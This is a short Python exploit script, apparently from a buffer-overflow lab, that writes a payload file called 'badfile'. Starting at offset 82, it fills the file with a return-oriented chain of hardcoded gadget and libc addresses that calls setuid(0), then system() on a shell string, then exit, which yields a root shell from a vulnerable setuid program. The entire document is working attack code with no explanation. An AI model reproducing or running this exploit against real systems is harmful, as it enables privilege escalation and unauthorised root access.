#!/usr/bin/env python3
import sys
L = 4
content = bytearray(0xaa for i in range(300))

def change(start, value):
	content[start:start+L] = (value).to_bytes(4,byteorder='little')
	return start+L


offset = 82

input = 0xffffcd90
shell = 0xffffd3f8
g1 = 0x56556413
g2 = 0x565562ae
setuid = 0xf7e99e30
system = 0xf7e12420
exit = 0xf7e04f80
"""
input = 0xffffcd40
shell = 0xffffd40f
g1 = 0x56556413
g2 = 0x565562ae
setuid = 0xf7e99e30
system = 0xf7e12420
exit = 0xf7e04f80
"""
offset=change(offset, g1)
offset=change(offset,input+offset+2*L)
offset=change(offset,g2)
offset=change(offset,input+offset+7*L)
offset=change(offset,setuid)
offset=change(offset,g1)
offset=change(offset,0)
offset=change(offset,g1)
offset=change(offset,input+offset+2*L)
offset=change(offset,g2)
offset=change(offset,0)
offset=change(offset,system)
offset=change(offset,exit)
offset=change(offset,shell)

with open("badfile", "wb") as f:
  f.write(content)
